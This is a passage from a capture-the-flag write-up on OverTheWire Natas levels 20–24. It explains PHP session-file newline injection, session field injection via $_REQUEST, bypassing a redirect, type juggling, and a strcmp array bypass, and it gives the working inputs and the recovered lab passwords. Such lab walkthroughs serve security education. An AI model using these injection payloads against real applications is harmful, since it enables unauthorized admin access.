</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug("MYREAD $sid"); 
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Reading from ". $filename);
</span><span class='line'>DEBUG: Read [name admin] // debug("Read [$line]");
</span><span class='line'>DEBUG: Read [] // debug("Read [$line]");
</span><span class='line'>DEBUG: Name set to admin // debug("Name set to " . $_REQUEST["name"]);
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:"admin"; // debug("MYWRITE $sid $data"); 
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Saving in ". $filename);
</span><span class='line'>DEBUG: name =&gt; admin // debug("$key =&gt; $value");</span></code></pre></td></tr></table></div></figure>


<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name admin
</span><span class='line'>admin 1</span></code></pre></td></tr></table></div></figure>


<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Read [name admin]
</span><span class='line'>DEBUG: Read [admin 1]
</span><span class='line'>DEBUG: Read []
</span><span class='line'>DEBUG: Name set to admin admin 1
</span><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas21
</span><span class='line'>Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:"admin admin 1";admin|s:1:"1";
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: admin =&gt; 1
</span><span class='line'>DEBUG: name =&gt; admin admin 1</span></code></pre></td></tr></table></div></figure>


<p>And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>

<h3>Level 21</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas21.png" title="natas21" alt="natas 21"></p>

<p>We need to satisfy the same requirements as before to get next password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas22</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas21css.png" title="natas21css" alt="natas 21css"></p>

<p>This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;[DEBUG] Session contents:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// only allow these keys</span>
</span><span class='line'><span class="nv">$validkeys</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;align&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;center&quot;</span><span class="p">,</span> <span class="s2">&quot;fontsize&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;100%&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;yellow&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$validkeys</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$defval</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$defval</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$form</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2">: &lt;input name=&#39;</span><span class="si">$key</span><span class="s2">&#39; value=&#39;</span><span class="si">$val</span><span class="s2">&#39; /&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/form&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$style</span> <span class="o">=</span> <span class="s2">&quot;background-color: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; text-align: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;align&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; font-size: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;fontsize&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$example</span> <span class="o">=</span> <span class="s2">&quot;&lt;div style=&#39;</span><span class="si">$style</span><span class="s2">&#39;&gt;Hello world!&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[DEBUG] Session contents:
</span><span class='line'>Array ( [align] =&gt; center [fontsize] =&gt; 100% [bgcolor] =&gt; blue [submit] =&gt; Update ) </span></code></pre></td></tr></table></div></figure>


<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST — An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST&#8217;ing, I modified the HTML using Firebug to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>bgcolor:
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="na">name=</span><span class="s">&quot;admin&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas22
</span><span class='line'>Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span></code></pre></td></tr></table></div></figure>


<h3>Level 22</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas22.png" title="natas22" alt="natas 22"></p>

<p>Pretty blank, eh? Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// only admins can reveal the password</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: /&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas23</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
</span><span class='line'>Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;</span></code></pre></td></tr></table></div></figure>


<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas23.png" title="natas23" alt="natas 23"></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>    if(array_key_exists("passwd",$_REQUEST)){
</span><span class='line'>        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] &gt; 10 )){
</span><span class='line'>            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
</span><span class='line'>            echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
</span><span class='line'>        }
</span><span class='line'>        else{
</span><span class='line'>            echo "&lt;br&gt;Wrong!&lt;br&gt;";
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>    // morla / 10111
</span><span class='line'>?&gt;  </span></code></pre></td></tr></table></div></figure>


<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg</span></code></pre></td></tr></table></div></figure>


<p>// (I thought at the beginning that the comment was related to the challenge, but it turns out that&rsquo;s the handle of the creator of the challenge).</p>

<h3>Level 24</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas23.png" title="natas24" alt="natas 24"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;passwd&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;passwd&quot;</span><span class="p">],</span><span class="s2">&quot;&lt;censored&gt;&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// morla / 10111</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int strcmp ( string $str1 , string $str2 )
</span><span class='line'>Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal. </span></code></pre></td></tr></table></div></figure>


<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
</span><span class='line'>
</span><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</span></code></pre></td></tr></table></div></figure>


<h3>Level 25</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas25.png" title="natas25" alt="natas 25"></p>

<p>Here we have a page with a quote that we can choose to view in English or German.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
